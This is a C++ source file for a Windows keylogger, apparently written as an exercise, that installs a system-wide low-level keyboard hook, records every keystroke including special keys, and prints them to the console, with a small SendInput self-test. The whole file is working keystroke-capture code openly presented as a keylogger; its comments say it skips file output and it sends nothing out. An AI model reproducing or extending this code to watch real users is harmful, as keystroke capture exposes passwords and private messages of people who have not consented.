#include <Windows.h>
#include <iostream>
#include <assert.h>

/*
KeyLogger for windows
Carlos Hernandez
8/4/2018
*/


/*
* Did not output to file as that was not a requirement,
* plus I didnt want to create a file on someone elses System needlessly.
* Made cases for some system keys.
* And for when they are released, (EX. Holding shift and typing)
*/

HHOOK hook;//GLOBAL as required by WH_KEYBOARD_LL


//Callback for the hook
LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam){
	BYTE kbdState[256];
	WCHAR buff[16];
	KBDLLHOOKSTRUCT kbdStruct;
	if (nCode >= 0/*HC_ACTION*/){ 
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN ){
			switch((uint32_t)(kbdStruct.vkCode)){
				case 0x1B:
					printf("%s", "[ESC]");
					break;
				case 0x0D:
					printf("%s", "[ENTER]");
					break;
				case 0x09:
					printf("%s", "[TAB]");
					break;
				case 0x10:
					printf("%s", "[SHIFT]");
					break;
				case 0x12:
					printf("%s", "[ALT]");
					break;
				case 0x14:
					printf("%s", "[CAPSLOCK]");
					break;
				case 0x20:
					printf("%s", "[SPACE]");
					break;
				case 0x25:
					printf("%s", "[LEFT]");
					break;
				case 0x26:
					printf("%s", "[UP]");
					break;
				case 0x27:
					printf("%s", "[RIGHT]");
					break;
				case 0x28:
					printf("%s", "[DOWN]");
					break;
				case 0x2D:
					printf("%s", "[INSERT]");
					break;
				case 0x2E:
					printf("%s", "[DEL]");
					break;
				case 0xA0:
					printf("%s", "[L-SHIFT]");
					break;
				case 0xA1:
					printf("%s", "[R-SHIFT]");
					break;
				case 0xA2:
					printf("%s", "[L-CNTRL]");
					break;
				case 0xA3:
					printf("%s", "[R-CNTRL]");
					break;
				default:
					GetKeyboardState((PBYTE) &kbdState);
					ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE)&kbdState, (LPWSTR)&buff, sizeof(buff)/2,0 );
					printf("%c", buff[0]);
					break;
			}

		}
		else if(wParam == WM_KEYUP || wParam == WM_SYSKEYUP ){
			switch((uint32_t)(kbdStruct.vkCode)){
				case 0x1B:
					printf("%s", "[ESC-UP]");
					break;
				case 0x0D:
					printf("%s\n", "[ENTER-UP]");
					break;
				case 0x09:
					printf("%s", "[TAB]");
					break;
				case 0x08:
					printf("%s", "[BACKSPACE-UP]");
					break;
				case 0x12:
					printf("%s", "[ALT-UP]");
					break;
				case 0x14:
					printf("%s", "[CAPSLOCK-UP]");
					break;
				case 0x20:
					printf("%s", "[SPACE-UP]");
					break;
				case 0x25:
					printf("%s", "[LEFT-UP]");
					break;
				case 0x26:
					printf("%s", "[UP-Release]");
					break;
				case 0x27:
					printf("%s", "[RIGHT-UP]");
					break;
				case 0x28:
					printf("%s", "[DOWN-UP]");
					break;
				case 0x2D:
					printf("%s", "[INSERT]");
					break;
				case 0x2E:
					printf("%s", "[DEL-UP]");
					break;
				case 0xA0:
					printf("%s", "[L-SHIFT-UP]");
					break;
				case 0xA1:
					printf("%s", "[R-SHIFT-UP]");
					break;
				case 0xA2:
					printf("%s", "[L-CNTRL-UP]");
					break;
				case 0xA3:
					printf("%s", "[R-CNTRL-UP]");
					break;
				default:
					break;
			}
		}
	}
	//ONWARDS to the next hookchain!
	return CallNextHookEx( hook, nCode, wParam, lParam);
}

//Setting that there hook thang
void setHook(){
	if (!( hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, NULL, 0)))
	{
		printf("%s\n", "FAILING HOOK");
	}
}
 
//THERE SHE BLOWS! -Ahab
void releaseHook(){
	UnhookWindowsHookEx(hook);
}

//Simple Unit test for the callback. Just tested the 'y' Key. 
void hookCallback_Test(){
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = 0;
	input.ki.wScan = 0x15;
	input.ki.dwFlags = KEYEVENTF_SCANCODE;
	input.ki.dwExtraInfo = 0;

	assert( SendInput(1, &input, sizeof(INPUT)) > 0);

	INPUT arr[5];

	for(int i = 0; i < 5; i++){
		arr[i].type = INPUT_KEYBOARD;
		arr[i].ki.wVk = 0;
		arr[i].ki.wScan = (0x15 + i);
		arr[i].ki.dwFlags = KEYEVENTF_SCANCODE;
		arr[i].ki.dwExtraInfo = 0;
	}

	assert( SendInput(5, arr, sizeof(INPUT)) == 5);
}
 
//Your main man !-(-.-)-!
int main(){
	setHook();
	hookCallback_Test();
	MSG msg;
	while (BOOL ret = GetMessage(&msg, NULL, 0, 0)){
		//Just a lil error handling
		if(ret == -1){
			releaseHook();
			printf("%s\n", "DONE");
			exit(1);
		}
		else{
			TranslateMessage(&msg);
        	DispatchMessage(&msg);
		}
	}
	releaseHook();
    return 0;
}